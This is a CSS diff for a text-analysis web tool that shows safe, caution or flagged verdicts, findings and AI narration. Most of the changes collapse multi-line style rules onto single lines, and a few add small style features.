@@ -46,6 +46,7 @@
     font-family:'Inter', sans-serif;
     -webkit-font-smoothing:antialiased;
     min-height:100vh;
+    transition:background .8s ease;
   }
   body.lang-hi{ font-family:'Noto Sans Devanagari','Inter', sans-serif; }
   body.lang-hi h1, body.lang-hi .brand-name, body.lang-hi .verdict-label, body.lang-hi .analyze-btn{
@@ -53,6 +54,7 @@
   }
 
   a{color:var(--brand);}
+  :focus-visible{ outline:2px solid var(--brand); outline-offset:2px; }
 
   .wrap{max-width:980px;margin:0 auto; padding:0 20px 80px;}
 
@@ -63,120 +65,31 @@
     padding:22px 0 18px;
     gap:12px;
   }
-  .brand{
-    display:flex;
-    align-items:center;
-    gap:10px;
-  }
-  .brand-mark{
-    width:34px; height:34px;
-    flex:none;
-    display:flex; align-items:center; justify-content:center;
-    color:var(--brand);
-  }
-  .brand-name{
-    font-family:'Sora', sans-serif;
-    font-weight:700;
-    font-size:17px;
-    letter-spacing:-0.01em;
-    color:var(--ink);
-  }
-  .lang-toggle{
-    display:flex;
-    background:var(--surface);
-    border:1px solid var(--border);
-    border-radius:999px;
-    padding:3px;
-    box-shadow:var(--shadow-sm);
-  }
-  .lang-btn{
-    font-family:'Inter', sans-serif;
-    font-size:12.5px;
-    font-weight:600;
-    background:transparent;
-    color:var(--ink-soft);
-    border:none;
-    border-radius:999px;
-    padding:7px 14px;
-    cursor:pointer;
-    transition:background .18s ease, color .18s ease;
-  }
+  .brand{ display:flex; align-items:center; gap:10px; }
+  .brand-mark{ width:34px; height:34px; flex:none; display:flex; align-items:center; justify-content:center; color:var(--brand); }
+  .brand-name{ font-family:'Sora', sans-serif; font-weight:700; font-size:17px; letter-spacing:-0.01em; color:var(--ink); }
+
+  .lang-toggle{ display:flex; background:var(--surface); border:1px solid var(--border); border-radius:999px; padding:3px; box-shadow:var(--shadow-sm); }
+  .lang-btn{ font-family:'Inter', sans-serif; font-size:12.5px; font-weight:600; background:transparent; color:var(--ink-soft); border:none; border-radius:999px; padding:7px 14px; cursor:pointer; transition:background .18s ease, color .18s ease; }
   .lang-btn.active{ background:var(--brand); color:#fff; }
 
-  .hero{
-    text-align:center;
-    padding:22px 0 34px;
-  }
-  h1{
-    font-family:'Sora', sans-serif;
-    font-weight:800;
-    font-size:clamp(30px, 5vw, 46px);
-    line-height:1.1;
-    letter-spacing:-0.02em;
-    margin:0 0 14px;
-    color:var(--ink);
-  }
+  .hero{ text-align:center; padding:22px 0 34px; }
+  h1{ font-family:'Sora', sans-serif; font-weight:800; font-size:clamp(30px, 5vw, 46px); line-height:1.1; letter-spacing:-0.02em; margin:0 0 14px; color:var(--ink); }
   h1 .accent{ color:var(--brand); }
-  .subhead{
-    font-size:16px;
-    color:var(--ink-soft);
-    max-width:560px;
-    margin:0 auto;
-    line-height:1.6;
-  }
+  .subhead{ font-size:16px; color:var(--ink-soft); max-width:560px; margin:0 auto; line-height:1.6; }
 
-  .card{
-    background:var(--surface);
-    border:1px solid var(--border);
-    border-radius:var(--radius);
-    box-shadow:var(--shadow-md);
-    padding:24px;
-  }
+  .card{ background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); box-shadow:var(--shadow-md); padding:24px; }
   @media (max-width:600px){ .card{ padding:18px; border-radius:14px; } }
 
-  .mode-tabs{
-    display:flex;
-    flex-wrap:wrap;
-    gap:6px;
-    margin-bottom:14px;
-  }
-  .mode-tab{
-    flex:1 1 calc(50% - 6px);
-    min-width:110px;
-    font-family:'Inter', sans-serif;
-    font-size:13px;
-    font-weight:600;
-    background:var(--surface-soft);
-    border:1px solid transparent;
-    color:var(--ink-soft);
-    border-radius:10px;
-    padding:10px 8px;
-    cursor:pointer;
-    text-align:center;
-    transition:all .16s ease;
-  }
+  .mode-tabs{ display:flex; flex-wrap:wrap; gap:6px; margin-bottom:14px; }
+  .mode-tab{ flex:1 1 calc(50% - 6px); min-width:110px; font-family:'Inter', sans-serif; font-size:13px; font-weight:600; background:var(--surface-soft); border:1px solid transparent; color:var(--ink-soft); border-radius:10px; padding:10px 8px; cursor:pointer; text-align:center; transition:all .16s ease; }
   .mode-tab:hover{ color:var(--ink); }
-  .mode-tab.active{
-    background:var(--brand);
-    color:#fff;
-    box-shadow:0 4px 10px rgba(14,124,107,0.28);
-  }
+  .mode-tab.active{ background:var(--brand); color:#fff; box-shadow:0 4px 10px rgba(14,124,107,0.28); }
 
   textarea{
-    width:100%;
-    min-height:170px;
-    resize:vertical;
-    background:transparent;
-    position:relative;
-    z-index:1;
-    border:1.5px solid var(--border);
-    border-radius:var(--radius-sm);
-    color:var(--ink);
-    font-family:'JetBrains Mono', monospace;
-    font-size:16px;
-    line-height:1.6;
-    padding:14px;
-    outline:none;
+    width:100%; min-height:170px; resize:vertical; background:transparent; position:relative; z-index:1;
+    border:1.5px solid var(--border); border-radius:var(--radius-sm); color:var(--ink);
+    font-family:'JetBrains Mono', monospace; font-size:16px; line-height:1.6; padding:14px; outline:none;
     transition:border-color .16s ease, background .16s ease;
   }
   @media (min-width: 600px){ textarea{ font-size:13.5px; min-height:200px; } }
@@ -185,161 +98,64 @@
   .live-highlight-wrap{ background:var(--surface-soft); border-radius:var(--radius-sm); }
   .live-highlight-wrap:focus-within{ background:var(--surface); }
 
-  .examples-label{
-    font-size:12px;
-    font-weight:600;
-    color:var(--ink-faint);
-    margin:16px 0 8px;
-    text-transform:uppercase;
-    letter-spacing:0.06em;
-  }
-  .examples{
-    display:flex;
-    flex-wrap:wrap;
-    gap:8px;
-  }
-  .chip{
-    font-family:'Inter', sans-serif;
-    font-size:12.5px;
-    font-weight:500;
-    background:var(--surface);
-    border:1px solid var(--border);
-    color:var(--ink-soft);
-    border-radius:999px;
-    padding:8px 13px;
-    cursor:pointer;
-    transition:all .15s ease;
-  }
-  .chip:hover{ border-color:var(--brand); color:var(--brand); transform:translateY(-1px); box-shadow:var(--shadow-sm); }
+  .char-count{ text-align:right; font-size:11.5px; color:var(--ink-faint); margin-top:6px; }
+  .char-count.near-limit{ color:var(--caution); font-weight:600; }
 
   .analyze-btn{
-    margin-top:20px;
-    width:100%;
-    font-family:'Sora', sans-serif;
-    font-size:16px;
-    font-weight:700;
-    letter-spacing:-0.005em;
-    background:var(--brand);
-    color:#fff;
-    border:none;
-    border-radius:var(--radius-sm);
-    padding:16px;
-    cursor:pointer;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:9px;
+    margin-top:16px; width:100%; font-family:'Sora', sans-serif; font-size:16px; font-weight:700; letter-spacing:-0.005em;
+    background:var(--brand); color:#fff; border:none; border-radius:var(--radius-sm); padding:16px; cursor:pointer;
+    display:flex; align-items:center; justify-content:center; gap:9px;
     transition:transform .1s ease, background .15s ease, box-shadow .15s ease;
     box-shadow:0 6px 16px rgba(14,124,107,0.28);
   }
-  .analyze-btn:hover{ background:var(--brand-dark); box-shadow:0 8px 20px rgba(14,124,107,0.34); }
-  .analyze-btn:active{ transform:scale(0.985); }
-  .analyze-btn:disabled{ opacity:0.65; cursor:wait; transform:none; }
+  .analyze-btn:hover:not(:disabled){ background:var(--brand-dark); box-shadow:0 8px 20px rgba(14,124,107,0.34); }
+  .analyze-btn:active:not(:disabled){ transform:scale(0.985); }
+  .analyze-btn:disabled{ opacity:0.65; cursor:not-allowed; transform:none; }
   .analyze-btn svg{ flex:none; }
 
-  .btn-spinner{
-    width:18px; height:18px;
-    border-radius:50%;
-    border:2.5px solid rgba(255,255,255,0.4);
-    border-top-color:#fff;
-    animation:spin 0.8s linear infinite;
-    display:none;
-  }
+  .btn-spinner{ width:18px; height:18px; border-radius:50%; border:2.5px solid rgba(255,255,255,0.4); border-top-color:#fff; animation:spin 0.8s linear infinite; display:none; }
   .analyze-btn.loading .btn-spinner{ display:inline-block; }
   .analyze-btn.loading .btn-icon{ display:none; }
   @keyframes spin{ to{ transform:rotate(360deg); } }
 
-  .helper-note{
-    text-align:center;
-    font-size:12.5px;
-    color:var(--ink-faint);
-    margin-top:12px;
-  }
+  .helper-note{ text-align:center; font-size:12.5px; color:var(--ink-faint); margin-top:12px; }
 
   #results-wrap{ margin-top:28px; }
 
-  @keyframes riseIn{
-    from{ opacity:0; transform:translateY(14px); }
-    to{ opacity:1; transform:translateY(0); }
-  }
+  @keyframes riseIn{ from{ opacity:0; transform:translateY(14px); } to{ opacity:1; transform:translateY(0); } }
   .reveal{ animation:riseIn .45s cubic-bezier(.22,1,.36,1) both; }
-  .reveal-1{ animation-delay:.02s; }
-  .reveal-2{ animation-delay:.08s; }
-  .reveal-3{ animation-delay:.14s; }
-  .reveal-4{ animation-delay:.20s; }
+  .reveal-1{ animation-delay:.02s; } .reveal-2{ animation-delay:.08s; } .reveal-3{ animation-delay:.14s; } .reveal-4{ animation-delay:.20s; }
 
-  .verdict-card{
-    background:var(--surface);
-    border:1px solid var(--border);
-    border-radius:var(--radius);
-    box-shadow:var(--shadow-md);
-    padding:26px;
-    text-align:center;
-  }
+  .verdict-card{ background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); box-shadow:var(--shadow-md); padding:26px; text-align:center; }
   @media (max-width:600px){ .verdict-card{ padding:20px 16px; } }
 
-  .verdict-icon-wrap{
-    width:76px; height:76px;
-    margin:0 auto 14px;
-    border-radius:50%;
-    display:flex; align-items:center; justify-content:center;
-    transition:background .3s ease;
-  }
+  .verdict-icon-wrap{ width:76px; height:76px; margin:0 auto 14px; border-radius:50%; display:flex; align-items:center; justify-content:center; transition:background .3s ease; }
   .verdict-icon-wrap.safe{ background:var(--safe-light); color:var(--safe); }
   .verdict-icon-wrap.caution{ background:var(--caution-light); color:var(--caution); }
   .verdict-icon-wrap.flagged{ background:var(--danger-light); color:var(--danger); }
   .verdict-icon-wrap.pending{ background:var(--brand-light); color:var(--brand); }
   .verdict-icon-wrap svg{ width:38px; height:38px; }
 
-  @keyframes popIn{
-    0%{ transform:scale(0.6); opacity:0; }
-    60%{ transform:scale(1.08); opacity:1; }
-    100%{ transform:scale(1); }
-  }
+  @keyframes popIn{ 0%{ transform:scale(0.6); opacity:0; } 60%{ transform:scale(1.08); opacity:1; } 100%{ transform:scale(1); } }
   .verdict-icon-wrap.animate-pop svg{ animation:popIn .45s cubic-bezier(.22,1.4,.36,1) both; }
 
-  @keyframes scanSweep{
-    0%{ transform:translateY(-120%); opacity:0; }
-    15%{ opacity:1; }
-    85%{ opacity:1; }
-    100%{ transform:translateY(120%); opacity:0; }
-  }
+  @keyframes scanSweep{ 0%{ transform:translateY(-120%); opacity:0; } 15%{ opacity:1; } 85%{ opacity:1; } 100%{ transform:translateY(120%); opacity:0; } }
   .verdict-icon-wrap.pending{ position:relative; overflow:hidden; }
   .verdict-icon-wrap.pending::after{
-    content:"";
-    position:absolute; left:0; right:0; height:40%;
+    content:""; position:absolute; left:0; right:0; height:40%;
     background:linear-gradient(180deg, transparent, rgba(14,124,107,0.35), transparent);
     animation:scanSweep 1.4s ease-in-out infinite;
   }
 
-  .verdict-label{
-    font-family:'Sora', sans-serif;
-    font-weight:700;
-    font-size:22px;
-    letter-spacing:-0.01em;
-    margin-bottom:6px;
-  }
+  .verdict-label{ font-family:'Sora', sans-serif; font-weight:700; font-size:22px; letter-spacing:-0.01em; margin-bottom:6px; }
   .verdict-label.safe{ color:var(--safe); }
   .verdict-label.caution{ color:var(--caution); }
   .verdict-label.flagged{ color:var(--danger); }
   .verdict-label.pending{ color:var(--brand); }
 
-  .verdict-summary{
-    font-size:15px;
-    color:var(--ink-soft);
-    line-height:1.6;
-    max-width:520px;
-    margin:0 auto 18px;
-  }
+  .verdict-summary{ font-size:15px; color:var(--ink-soft); line-height:1.6; max-width:520px; margin:0 auto 18px; }
 
-  .score-row{
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    gap:22px;
-    flex-wrap:wrap;
-    margin-top:6px;
-  }
+  .score-row{ display:flex; align-items:center; justify-content:center; gap:22px; flex-wrap:wrap; margin-top:6px; }
   .score-ring-block{ display:flex; align-items:center; gap:12px; }
   .score-ring circle.track{ stroke:var(--border); }
   .score-ring circle.fill{ transition:stroke-dashoffset 1s cubic-bezier(.22,1,.36,1), stroke .3s ease; stroke-linecap:round; }
@@ -347,275 +163,97 @@
   .score-label{ font-size:11px; color:var(--ink-faint); font-weight:600; text-transform:uppercase; letter-spacing:0.05em; margin-top:2px;}
 
   .source-pills{ display:flex; gap:8px; flex-wrap:wrap; justify-content:center; }
-  .source-pill{
-    font-size:11.5px;
-    font-weight:600;
-    background:var(--surface-soft);
-    border:1px solid var(--border);
-    border-radius:999px;
-    padding:6px 12px;
-    color:var(--ink-soft);
-  }
+  .source-pill{ font-size:11.5px; font-weight:600; background:var(--surface-soft); border:1px solid var(--border); border-radius:999px; padding:6px 12px; color:var(--ink-soft); }
   .source-pill b{ color:var(--ink); }
 
-  .error-banner{
-    background:var(--danger-light);
-    border-radius:var(--radius-sm);
-    padding:12px 14px;
-    font-size:13px;
-    line-height:1.6;
-    color:#8f2f2f;
-    margin-top:18px;
-    text-align:left;
+  .disagree-note{
+    margin-top:14px; text-align:left; font-size:12.5px; line-height:1.6; color:var(--brand-dark);
+    background:var(--brand-light); border-radius:var(--radius-sm); padding:10px 13px;
   }
-  .retry-btn{
-    margin-top:10px;
-    font-size:12.5px;
-    font-weight:600;
-    background:#fff;
-    border:1px solid var(--danger);
-    color:var(--danger);
-    border-radius:8px;
-    padding:8px 14px;
-    cursor:pointer;
-    transition:background .15s ease;
-  }
+
+  .error-banner{ background:var(--danger-light); border-radius:var(--radius-sm); padding:12px 14px; font-size:13px; line-height:1.6; color:#8f2f2f; margin-top:18px; text-align:left; }
+  .retry-btn{ margin-top:10px; font-size:12.5px; font-weight:600; background:#fff; border:1px solid var(--danger); color:var(--danger); border-radius:8px; padding:8px 14px; cursor:pointer; transition:background .15s ease; }
   .retry-btn:hover{ background:var(--danger); color:#fff; }
 
-  .section{
-    background:var(--surface);
-    border:1px solid var(--border);
-    border-radius:var(--radius);
-    box-shadow:var(--shadow-sm);
-    margin-top:16px;
-    overflow:hidden;
-  }
-  .section-head{
-    display:flex;
-    align-items:center;
-    gap:10px;
-    padding:18px 22px;
-  }
+  .section{ background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); box-shadow:var(--shadow-sm); margin-top:16px; overflow:hidden; }
+  .section-head{ display:flex; align-items:center; gap:10px; padding:18px 22px; }
   .section-head svg{ flex:none; color:var(--brand); }
-  .section-title{
-    font-family:'Sora', sans-serif;
-    font-weight:700;
-    font-size:15.5px;
-    color:var(--ink);
-  }
-  .section-sub{
-    font-size:12.5px;
-    color:var(--ink-faint);
-    margin-top:2px;
-  }
+  .section-title{ font-family:'Sora', sans-serif; font-weight:700; font-size:15.5px; color:var(--ink); }
+  .section-sub{ font-size:12.5px; color:var(--ink-faint); margin-top:2px; }
   .section-body{ padding:0 22px 22px; }
   @media (max-width:600px){ .section-head, .section-body{ padding-left:16px; padding-right:16px; } }
 
   .evidence-block{
-    background:var(--surface-soft);
-    border:1px solid var(--border);
-    border-radius:var(--radius-sm);
-    padding:14px;
-    font-family:'JetBrains Mono', monospace;
-    font-size:13px;
-    line-height:1.8;
-    white-space:pre-wrap;
-    word-break:break-word;
-    overflow-wrap:anywhere;
+    background:var(--surface-soft); border:1px solid var(--border); border-radius:var(--radius-sm); padding:14px;
+    font-family:'JetBrains Mono', monospace; font-size:13px; line-height:1.8; white-space:pre-wrap; word-break:break-word; overflow-wrap:anywhere;
   }
-  mark{
-    background:none;
-    color:inherit;
-    padding:0 2px;
-    border-radius:3px;
-    cursor:help;
-    font-weight:600;
-  }
+  mark{ background:none; color:inherit; padding:0 2px; border-radius:3px; cursor:help; font-weight:600; }
   mark.sev-high{ background:var(--danger-light); color:#8f2f2f; }
   mark.sev-med{ background:var(--caution-light); color:#8a5c14; }
 
   .findings-list{ display:flex; flex-direction:column; gap:10px; }
-  .finding{
-    display:flex;
-    gap:12px;
-    padding:13px 14px;
-    border-radius:var(--radius-sm);
-    border:1px solid var(--border);
-    background:var(--surface);
-    transition:transform .15s ease, box-shadow .15s ease;
-  }
+  .finding{ display:flex; gap:12px; padding:13px 14px; border-radius:var(--radius-sm); border:1px solid var(--border); background:var(--surface); transition:transform .15s ease, box-shadow .15s ease; }
   .finding:hover{ transform:translateY(-1px); box-shadow:var(--shadow-sm); }
-  .finding-icon{
-    flex:none;
-    width:30px; height:30px;
-    border-radius:8px;
-    display:flex; align-items:center; justify-content:center;
-  }
+  .finding-icon{ flex:none; width:30px; height:30px; border-radius:8px; display:flex; align-items:center; justify-content:center; }
   .finding.sev-high .finding-icon{ background:var(--danger-light); color:var(--danger); }
   .finding.sev-med .finding-icon{ background:var(--caution-light); color:var(--caution); }
-  .finding-cat{
-    font-size:11px;
-    font-weight:700;
-    text-transform:uppercase;
-    letter-spacing:0.05em;
-    color:var(--brand);
-    margin-bottom:3px;
-  }
+  .finding-cat{ font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.05em; color:var(--brand); margin-bottom:3px; }
   .finding-desc{ font-size:14px; line-height:1.55; color:var(--ink); margin:0; }
-  .finding-match{
-    font-family:'JetBrains Mono', monospace;
-    font-size:12px;
-    background:var(--surface-soft);
-    padding:1px 6px;
-    border-radius:4px;
-    word-break:break-all;
-  }
-  .no-findings{
-    font-size:13.5px;
-    color:var(--ink-soft);
-    background:var(--safe-light);
-    border-radius:var(--radius-sm);
-    padding:14px;
-    line-height:1.6;
-  }
+  .finding-match{ font-family:'JetBrains Mono', monospace; font-size:12px; background:var(--surface-soft); padding:1px 6px; border-radius:4px; word-break:break-all; }
+  .no-findings{ font-size:13.5px; color:var(--ink-soft); background:var(--safe-light); border-radius:var(--radius-sm); padding:14px; line-height:1.6; }
+  .no-findings.has-ai-flag{ background:var(--caution-light); }
 
-  .checklist-toggle{
-    width:100%;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    background:transparent;
-    border:none;
-    padding:18px 22px;
-    cursor:pointer;
-    text-align:left;
-  }
+  .checklist-toggle{ width:100%; display:flex; align-items:center; justify-content:space-between; background:transparent; border:none; padding:18px 22px; cursor:pointer; text-align:left; }
   @media (max-width:600px){ .checklist-toggle{ padding-left:16px; padding-right:16px; } }
   .checklist-toggle:hover .section-title{ color:var(--brand); }
   .chevron{ transition:transform .25s ease; color:var(--ink-faint); flex:none; }
   .checklist-toggle[aria-expanded="true"] .chevron{ transform:rotate(180deg); }
 
-  .checklist-panel{
-    max-height:0;
-    overflow:hidden;
-    transition:max-height .35s ease;
-  }
+  .checklist-panel{ max-height:0; overflow:hidden; transition:max-height .35s ease; }
   .checklist-panel.open{ max-height:2000px; }
   .checklist-inner{ padding:0 22px 22px; }
   @media (max-width:600px){ .checklist-inner{ padding-left:16px; padding-right:16px; } }
 
   .checklist-group{ margin-bottom:14px; }
   .checklist-group:last-child{ margin-bottom:0; }
-  .checklist-group-name{
-    font-size:11px;
-    font-weight:700;
-    text-transform:uppercase;
-    letter-spacing:0.06em;
-    color:var(--ink-faint);
-    margin-bottom:8px;
-  }
-  .checklist-row{
-    display:flex;
-    align-items:center;
-    gap:10px;
-    font-size:13.5px;
-    padding:6px 0;
-    color:var(--ink-soft);
-  }
+  .checklist-group-name{ font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.06em; color:var(--ink-faint); margin-bottom:8px; }
+  .checklist-row{ display:flex; align-items:center; gap:10px; font-size:13.5px; padding:6px 0; color:var(--ink-soft); }
   .checklist-row.fail{ color:var(--ink); font-weight:600; }
-  .check-icon{
-    flex:none;
-    width:20px; height:20px;
-    border-radius:50%;
-    display:flex; align-items:center; justify-content:center;
-  }
+  .check-icon{ flex:none; width:20px; height:20px; border-radius:50%; display:flex; align-items:center; justify-content:center; }
   .check-icon.pass{ background:var(--safe-light); color:var(--safe); }
   .check-icon.fail-high{ background:var(--danger-light); color:var(--danger); }
   .check-icon.fail-med{ background:var(--caution-light); color:var(--caution); }
   .check-icon svg{ width:12px; height:12px; }
 
-  .ai-card{
-    background:linear-gradient(180deg, var(--brand-light), var(--surface) 70%);
-    border-radius:var(--radius-sm);
-    padding:16px 18px;
-    border:1px solid var(--border);
-  }
-  .ai-card-head{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    flex-wrap:wrap;
-    gap:8px;
-    margin-bottom:10px;
-  }
-  .ai-category{
-    font-size:12px;
-    font-weight:700;
-    color:var(--brand-dark);
-    text-transform:uppercase;
-    letter-spacing:0.04em;
-  }
-  .ai-badge{
-    font-family:'Sora', sans-serif;
-    font-size:11.5px;
-    font-weight:700;
-    padding:4px 11px;
-    border-radius:999px;
-    letter-spacing:0.02em;
-  }
+  .ai-card{ background:linear-gradient(180deg, var(--brand-light), var(--surface) 70%); border-radius:var(--radius-sm); padding:16px 18px; border:1px solid var(--border); }
+  .ai-card-head{ display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; margin-bottom:10px; }
+  .ai-category{ font-size:12px; font-weight:700; color:var(--brand-dark); text-transform:uppercase; letter-spacing:0.04em; }
+  .ai-badge{ font-family:'Sora', sans-serif; font-size:11.5px; font-weight:700; padding:4px 11px; border-radius:999px; letter-spacing:0.02em; }
   .ai-badge.safe{ background:var(--safe-light); color:var(--safe); }
   .ai-badge.caution{ background:var(--caution-light); color:var(--caution); }
   .ai-badge.flagged{ background:var(--danger-light); color:var(--danger); }
   .ai-body{ font-size:14.5px; line-height:1.65; color:var(--ink); }
-  .ai-foot{
-    margin-top:12px;
-    font-size:11.5px;
-    color:var(--ink-faint);
-    display:flex;
-    gap:14px;
-    flex-wrap:wrap;
-  }
-  .ai-pending{
-    display:flex;
-    align-items:center;
-    gap:10px;
-    font-size:13.5px;
-    color:var(--ink-soft);
-  }
+  .ai-foot{ margin-top:12px; font-size:11.5px; color:var(--ink-faint); display:flex; gap:14px; flex-wrap:wrap; }
+  .ai-pending{ display:flex; align-items:center; gap:10px; font-size:13.5px; color:var(--ink-soft); }
   .dot-flow{ display:flex; gap:4px; }
-  .dot-flow span{
-    width:6px; height:6px; border-radius:50%;
-    background:var(--brand);
-    animation:dotPulse 1.2s ease-in-out infinite;
-  }
+  .dot-flow span{ width:6px; height:6px; border-radius:50%; background:var(--brand); animation:dotPulse 1.2s ease-in-out infinite; }
   .dot-flow span:nth-child(2){ animation-delay:.15s; }
   .dot-flow span:nth-child(3){ animation-delay:.3s; }
   @keyframes dotPulse{ 0%,80%,100%{ opacity:.25; transform:scale(.8);} 40%{ opacity:1; transform:scale(1);} }
 
-  footer{
-    margin-top:40px;
-    text-align:center;
-    font-size:12.5px;
-    color:var(--ink-faint);
-    line-height:1.7;
-  }
+  footer{ margin-top:40px; text-align:center; font-size:12.5px; color:var(--ink-faint); line-height:1.7; }
+  .signature{ opacity:.55; }
 
-  /* ============ Ambient background (particles) ============ */
-  #bg-canvas{
-    position:fixed; inset:0; width:100%; height:100%;
-    z-index:-1; pointer-events:none;
-    transition:opacity 1.2s ease;
-  }
+  /* Ambient background */
+  #bg-canvas{ position:fixed; inset:0; width:100%; height:100%; z-index:-1; pointer-events:none; transition:opacity 1.2s ease; }
   body.mood-safe #bg-canvas{ opacity:0.55; }
   body.mood-caution #bg-canvas{ opacity:0.7; }
   body.mood-flagged #bg-canvas{ opacity:0.85; }
 
-  body{ transition:background .8s ease; }
   body.mood-safe{ background: linear-gradient(180deg, #F2FBF6, var(--bg) 55%); }
   body.mood-caution{ background: linear-gradient(180deg, #FFF9EE, var(--bg) 55%); }
   body.mood-flagged{ background: linear-gradient(180deg, #FDF1F1, var(--bg) 55%); }
 
-  /* ============ AI brain mark (header) ============ */
   .brand-mark.ai-brain{ position:relative; }
   .brain-node{ animation:brainPulse 2.6s ease-in-out infinite; transform-origin:center; }
   .brain-node:nth-child(2){ animation-delay:.2s; }
@@ -626,221 +264,104 @@
   .brain-link{ stroke-dasharray:3 3; animation:brainFlow 3s linear infinite; }
   @keyframes brainFlow{ to{ stroke-dashoffset:-24; } }
 
-  /* ============ Assistant narration ============ */
-  .assistant-bubble{
-    display:flex; gap:12px; align-items:flex-start;
-    background:var(--surface); border:1px solid var(--border);
-    border-radius:var(--radius); box-shadow:var(--shadow-md);
-    padding:18px 20px; margin-top:10px;
-  }
-  .assistant-avatar{
-    flex:none; width:38px; height:38px; border-radius:50%;
-    background:var(--brand-light); color:var(--brand);
-    display:flex; align-items:center; justify-content:center;
-    position:relative; overflow:hidden;
-  }
-  .assistant-avatar::after{
-    content:""; position:absolute; inset:0; border-radius:50%;
-    border:2px solid var(--brand); opacity:.5;
-    animation:avatarRing 1.6s ease-out infinite;
-  }
-  @keyframes avatarRing{ 0%{ transform:scale(0.8); opacity:.6;} 100%{ transform:scale(1.5); opacity:0;} }
+  /* Assistant narration */
+  .assistant-bubble{ display:flex; gap:12px; align-items:flex-start; background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); box-shadow:var(--shadow-md); padding:18px 20px; margin-top:10px; }
+  .assistant-avatar{ flex:none; width:38px; height:38px; border-radius:50%; background:var(--brand-light); color:var(--brand); display:flex; align-items:center; justify-content:center; position:relative; }
+  .assistant-avatar-ring{ position:absolute; inset:0; border-radius:50%; border:2px solid var(--brand); opacity:.5; animation:avatarRing 1.6s ease-out infinite; pointer-events:none; }
+  @keyframes avatarRing{ 0%{ transform:scale(0.8); opacity:.6;} 100%{ transform:scale(1.6); opacity:0;} }
   .assistant-text{ flex:1; min-width:0; }
-  .assistant-line{
-    font-size:14px; color:var(--ink); line-height:1.6; margin:0 0 4px;
-    min-height:1.4em;
-  }
-  .assistant-cursor{
-    display:inline-block; width:2px; height:14px; background:var(--brand);
-    margin-left:2px; vertical-align:middle;
-    animation:cursorBlink 0.9s step-end infinite;
-  }
+  .assistant-line{ font-size:14px; color:var(--ink); line-height:1.6; margin:0 0 4px; min-height:1.4em; }
+  .assistant-cursor{ display:inline-block; width:2px; height:14px; background:var(--brand); margin-left:2px; vertical-align:middle; animation:cursorBlink 0.9s step-end infinite; }
   @keyframes cursorBlink{ 50%{ opacity:0; } }
 
   .scan-timeline{ display:flex; flex-direction:column; gap:6px; margin-top:12px; }
-  .scan-step{
-    display:flex; align-items:center; gap:9px; font-size:12.5px; color:var(--ink-faint);
-    opacity:0; transform:translateX(-6px);
-    transition:opacity .3s ease, transform .3s ease, color .3s ease;
-  }
+  .scan-step{ display:flex; align-items:center; gap:9px; font-size:12.5px; color:var(--ink-faint); opacity:0; transform:translateX(-6px); transition:opacity .3s ease, transform .3s ease, color .3s ease; }
   .scan-step.active{ opacity:1; transform:translateX(0); color:var(--ink-soft); }
   .scan-step.done{ opacity:1; transform:translateX(0); color:var(--ink); }
-  .scan-step .step-icon{
-    flex:none; width:16px; height:16px; border-radius:50%;
-    background:var(--surface-soft); border:1.5px solid var(--border);
-    display:flex; align-items:center; justify-content:center;
-    transition:all .25s ease;
-  }
+  .scan-step .step-icon{ flex:none; width:16px; height:16px; border-radius:50%; background:var(--surface-soft); border:1.5px solid var(--border); display:flex; align-items:center; justify-content:center; transition:all .25s ease; }
   .scan-step.done .step-icon{ background:var(--safe); border-color:var(--safe); color:#fff; }
   .scan-step.active .step-icon{ border-color:var(--brand); }
   .scan-step .step-icon svg{ width:9px; height:9px; }
 
-  /* ============ Scan sweep over textarea ============ */
+  /* Scan sweep over textarea */
   .textarea-wrap{ position:relative; }
-  .scan-overlay{
-    position:absolute; inset:0; border-radius:var(--radius-sm); z-index:2;
-    pointer-events:none; overflow:hidden; opacity:0; transition:opacity .25s ease;
-  }
+  .scan-overlay{ position:absolute; inset:0; border-radius:var(--radius-sm); z-index:2; pointer-events:none; overflow:hidden; opacity:0; transition:opacity .25s ease; }
   .scan-overlay.active{ opacity:1; }
-  .scan-overlay .sweep-line{
-    position:absolute; left:0; right:0; height:2px;
-    background:linear-gradient(90deg, transparent, var(--brand), transparent);
-    box-shadow:0 0 12px 2px rgba(14,124,107,0.5);
-    animation:sweepDown 1.6s ease-in-out infinite;
-  }
+  .scan-overlay .sweep-line{ position:absolute; left:0; right:0; height:2px; background:linear-gradient(90deg, transparent, var(--brand), transparent); box-shadow:0 0 12px 2px rgba(14,124,107,0.5); animation:sweepDown 1.6s ease-in-out infinite; }
   @keyframes sweepDown{ 0%{ top:0%; } 100%{ top:100%; } }
-  .scan-overlay .grid-flicker{
-    position:absolute; inset:0;
-    background-image:repeating-linear-gradient(0deg, rgba(14,124,107,0.05) 0 1px, transparent 1px 22px);
-  }
+  .scan-overlay .grid-flicker{ position:absolute; inset:0; background-image:repeating-linear-gradient(0deg, rgba(14,124,107,0.05) 0 1px, transparent 1px 22px); }
 
-  /* ============ Live token highlight (mirror overlay) ============ */
+  /* Live token highlight (mirror overlay) */
   .live-highlight-wrap{ position:relative; }
   .live-highlight-mirror{
-    position:absolute; inset:0; margin:0; padding:14px;
-    font-family:'JetBrains Mono', monospace; font-size:16px; line-height:1.6;
-    color:transparent; white-space:pre-wrap; word-break:break-word; overflow-wrap:anywhere;
-    pointer-events:none; overflow:hidden; border:1.5px solid transparent; border-radius:var(--radius-sm);
+    position:absolute; inset:0; margin:0; padding:14px; font-family:'JetBrains Mono', monospace; font-size:16px; line-height:1.6;
+    color:transparent; white-space:pre-wrap; word-break:break-word; overflow-wrap:anywhere; pointer-events:none; overflow:hidden;
+    border:1.5px solid transparent; border-radius:var(--radius-sm);
   }
   @media (min-width:600px){ .live-highlight-mirror{ font-size:13.5px; } }
-  .live-highlight-mirror mark{
-    background:var(--caution-light); color:transparent; border-radius:3px;
-    animation:tokenPop .3s ease both;
-  }
+  .live-highlight-mirror mark{ background:var(--caution-light); color:transparent; border-radius:3px; }
   .live-highlight-mirror mark.tok-high{ background:var(--danger-light); }
-  @keyframes tokenPop{ from{ background-color:rgba(217,138,31,0); } }
 
